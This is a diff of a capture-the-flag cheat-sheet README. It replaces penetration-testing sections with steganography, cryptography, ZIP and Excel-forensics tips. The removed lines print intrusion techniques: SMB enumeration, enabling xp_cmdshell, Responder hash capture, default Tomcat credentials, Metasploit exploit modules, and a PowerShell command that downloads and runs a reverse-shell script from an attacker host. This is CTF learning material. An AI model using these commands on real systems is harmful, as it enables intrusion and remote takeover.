@@ -1,7 +1,5 @@
-CTF-Katana
+CTF-Katana-Steg-Crypto
 ===============
-
-> John Hammond | February 1st, 2018
 
 --------------------------
 
@@ -15,15 +13,7 @@ are welcome!
 ---------------
 # Table of Contents
 
-1. [Post-Exploitation](#post-exploitation)
-2. [Port Enumeration](#port-enumeration)
-3. [445 (smb/Samba)](#445-smbsamba)
-4. [1433 (Microsoft SQL Server)](#1433-microsoft-sql-server)
-5. [SNMP](#snmp)
-6. [Microsoft Office Macros](#microsoft-office-macros)
-7. [Retrieving Network Service Hashes](#retrieving-network-service-hashes)
-8. [Windows Reverse Shells](#windows-reverse-shells)
-9. [Known Exploits](#known-exploits)
+09. [ZIP](#zip)
 10. [Excess](#excess)
 11. [Esoteric Languages](#esoteric-languages)
 13. [Steganography](#steganography)
@@ -44,216 +34,15 @@ are welcome!
 28. [Miscellaneous](#miscellaneous)
 29. [Jail Breaks](#jail-breaks)
 30. [Trivia](#trivia)
+31. [Excel files](#excel-files)
 
 ---------------
 
-Post-Exploitation
-====================
-
-* [static-binaries]
-
-	If you need to use a program that is not on the box you just broke into, try and build a static binary! I've seen this used on Fatty for HackTheBox, getting a `pty` with the typical `python -c 'import pty...'` trick when it didn't have Python originally!
-
-	https://github.com/andrew-d/static-binaries
-
-Port Enumeration
-====================
-
-
-445 (smb/Samba)
------------------------
-
-* [`smbmap`](https://github.com/ShawnDEvans/smbmap)
-
-	`smbmap` tells you permissions and access, which `smbclient` does _not_ do!
-
-	To try and list shares as the anonymous user **DO THIS** (this doesn't always work for some weird reason)
-
-```
-smbmap -H 10.10.10.125 -u anonymous
-```
-
-Or you can attempt just:
-
-```
-smbmap -H 10.10.10.125
-```
-
-And you can specify a domain like so:
-
-```
-smbmap -H 10.10.10.125 -u anonymous -d HTB.LOCAL
-```
-
-Worth trying `localhost` as a domain, if that gets "NO_LOGON_SERVERS"
-
-```
-smbmap -H 10.10.10.125 -u anonymous -d localhost
-```
-
-* `enum4linux`
-
-
-```
-enum4linux 10.10.10.125
-```
-
-* `smbclient`
-
-	**NOTE: DEPENDING ON THE VERSION OF SMBCLIENT YOU ARE USING, you may need to SPECIFY the use of S<B version 1 or SMB version 2. You can dp this with `-m SMB2`. Older versions of SMBclient (latest being 4.10 at the time of writing) use SMB1 _by default_.**
-
-	You can use `smbclient` to look through files shared with SMB. To _list_ available shares:
-
-```
-smbclient -m SMB2 -N -L //10.10.10.125/
-```
-
-Once you find a share you want to/can access, you can connect to shares by using the name following the locator:
-
-```
-smbclient -m SMB2 -N //10.10.10.125/Reports
-```
-
-You will see a `smb: \>` prompt, and you can use `ls` and `get` to retrieve files or even `put` if you need to place files there.
-
-1433 (Microsoft SQL Server)
-------------------------------
-
-* `impacket` -> `mssqlclient.py`
-
-	You can connect to a Microsoft SQL Server with `myssqlclient.py` knowing a username and password like so:
-
-```
-mssqlclient.py username@10.10.10.125
-```
-
-It will prompt you for a password. **If your password fails, the server might be using "Windows authentication", which you can use with:**
-
-```
-mssqlclient.py username@10.10.10.125 -windows-auth
-```
-
-If you have access to a Micosoft SQL Server, you can try and `enable_xp_cmdshell` to run commands. With `mssqlclient.py` you can try:
-
-```
-SQL> enable_xp_cmdshell
-```
-
-though, you may not have permission. If that DOES succeed, you can now run commands like:
-
-```
-SQL> xp_cmdshell whoami
-```
-
-SNMP
-----------------
-
-* snmp-check
-
-```
-snmp-check 10.10.10.125
-```
-
-
-Microsoft Office Macros
----------------
-
-* [`oletools`](https://github.com/decalage2/oletools) -> `olevba`
-
-	`olevba` can look for Macros within office documents (which you should always check) with just supplying the filename:
-
-```
-olevba "Currency Volume Report.xlsm"
-```
-
-Retrieving Network Service Hashes
-----------------------------------
-
-
-* [`Responder.py`](https://github.com/SpiderLabs/Responder)
-
-
-```
-./Responder.py -I tun0
-```
-
-
-Windows Reverse Shells
----------------------------
-
-
-* [Nishang][nishang]
-
-	If you have access to PowerShell,  you can get a Reverse shell by using [nishang]'s `Invoke-PowerShellTcp.ps1` script inside of the `Shells` directory. Be sure to add the function call example to the bottom of your script, so all you need to to do to host it is (on your Attacker machine):
-
-```
-python -m SimpleHTTPServer
-```
-
-and then on the victim machine:
-
-```
-powershell IEX( New-Object Net.WebClient).DownloadString("http://10.10.14.6:8000/reverse.ps1") )
-```
-
-Also, if you want to have nice up and down arrow key usage within your Windows reverse shell, you can use the utility `rlwrap` before your netcat listener command.
-
-```
-rlwrap nc -lnvp 9001
-```
-
-
-Known Exploits
-------------------
-
-* Java RMI
-
-	Metasploit module: `exploit/multi/misc/java_rmi_server`
-
-	When testing this, responses are _known to come back with an error or exception_. Your code MAY VERY WELL still be executing. Try and run commands that include a callback. And _use Python_ to live off the land and try avoid special characters, like `|` pipes! [ysoserial](https://github.com/frohoff/ysoserial) is a good tool for deserializing Java code to take advantage of this vulnerability.
-
-* Heartbleed
-
-	Metasploit module: `auxiliary/scanner/ssl/openssl_heartbleed`
-
-	Be sure to use `set VERBOSE true` to see the retrieved results. This can often contain a flag or some valuable information.
-
-* libssh - SSH
-
-	`libssh0.8.1` (or others??) is vulnerable to an easy and immediate login. Metasploit module: `auxiliary/scanner/ssh/libssh_auth_bypass`. Be sure to `set spawn_pty true` to actually receive a shell! Then `sessions -i 1` to interact with the shell spawned (or whatever appropriate ID)
-
-* Bruteforcing RDP
-
-	Bruteforcing RDP with `hydra` or `ncrack` is __NOT ALWAYS ADVISABLE__ because of Cred-SSB. An option _might_ be to script xrdp to automate against a password or word list... __but THIS IS NOT TESTED__.
-
-* Apache Tomcat
-
-	If you can determine that you are working with an Apache Tomcat server (usually by visiting pages that do not exist and seeing a 404 error message), try to visit `/Manager`, which is usually accessible on Tomcat. Possible credentials could be `tomcat:tomcat`, `tomcat:s3cr3t`, `admin:s3cr3t`, `root:s3cr3t`, etc. etc.. Worthy of bruteforcing with `hydra`.
-
-	If you see URLs are appended with a `.action` (not a `.do`), you may be working with Apache Struts.
-
-* Apache Struts
-
-	To identify the Apache Struts version is running,
-
-Excess
+Zip
 --------
+Zip into zips here you are : https://github.com/nlitsme/zipdump
+command that works: zipdump.py --dumpraw --recurse dump.zip --extract
 
-* [wifite2](https://github.com/derv82/wifite2)
-
-	Brute-force a Wi-Fi access point.
-
-* [impacket](https://github.com/SecureAuthCorp/impacket)
-
-	Tool to quickly spin up a Samba share.
-
-* [enum4linux](https://github.com/portcullislabs/enum4linux)
-
-	Script to scan Windows Samba shares. VERY GOOD TO RUN FOR WINDOWS ENUMERATION.
-
-* [drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)
-
-	Attack script for old or outdated Drupal servers. Usually very effective.
 
 Esoteric Languages
 -----------------------
@@ -348,8 +137,13 @@ Whisper my world
 
 Steganography
 ---------------------
+* For pictures you may want to increase the dimension for ex: 200x180 to 200x200. (u can do that with winhex)
+* You may know which file you have with exiftool
 
-* [StegCracker][StegCracker]
+* Don't forget to see this https://book.hacktricks.xyz/stego/stego-tricks
+
+* [PDF][PDF]
+	Try to open the pdf in photoshop as you can see other layers.
 
 	Don't ever forget about [`steghide`][steghide]! This tool can use a password list like `rockyou.txt` with steghide. SOME IMAGES CAN HAVE MULTIPLE FILED ENCODED WITH MULTIPLE PASSWORDS.
 
@@ -371,7 +165,7 @@ Steganography
 
 * [`Stegsolve.jar`][Stegsolve.jar]
 
-	A [Java][Java] [`.JAR`][JAR] tool, that will open an image and let you as the user arrow through different renditions of the image (viewing color channels, inverted colors, and more). The tool is surprisingly useful.
+	A [Java][Java] [`.JAR`][JAR] tool, that will open an image and let you as the user arrow through different renditions of the image (viewing color channels, inverted colors, and more). The tool is surprisingly useful. After checking all layers and channels. Have a look in the offset! For this you need to use the option "Analyse > Stegogram Solver".
 
 * [`steghide`][steghide]
 
@@ -398,7 +192,9 @@ Steganography
 * Unicode Steganography / Zero-Width Space Characters
 
 	Some text that may be trying to hide something, in a seemingly innocent way, like "Hmm, there may be something hiding here..." may include zero-width characters. This is a utility that might help: [https://330k.github.io/misc_tools/unicode_steganography.html](https://330k.github.io/misc_tools/unicode_steganography.html) ... Other options are just gross find and replace operations in Python IDLE.
-
+* Offline LSB Tools
+	This one is better than online ones: StegoLSB: https://gist.github.com/dhondta/d2151c82dcd9a610a7380df1c6a0272c
+	
 * Online LSB Tools
 
 	There are many online LSB tools that work in different ways. If you are given a file that you know is part of a Least Significant Bit challenge, try these tools:
@@ -499,6 +295,8 @@ sudo apt install zbar-tools
 
 Cryptography
 -----------------
+
+* To identify, use dcode or https://www.cryptool.org/en/cto/ncid#:~:text=NCID%20allows%20to%20identify%20the%20cipher%20type%2C%20given,from%20which%20you%20can%20select%20one%20or%20more.
 
 * Cryptii
 
@@ -1551,6 +1349,11 @@ ICMP
 OpenToAll - https://opentoallctf.github.io/
 ```
 
+Excel files
+-------------
+
+- For doing a forensic analysis on an excel file you may unzip it.
+- Some excel sheet are protected, in that case, search for the file (usually an xml file) where there is a sheet protection hash and salt. For removing the protection, remove every thing in the tag < sheet protection algorithm name> etc, re-zip everything...
 
 [steghide]: http://steghide.sourceforge.net/
 [snow]: http://www.darkside.com.au/snow/
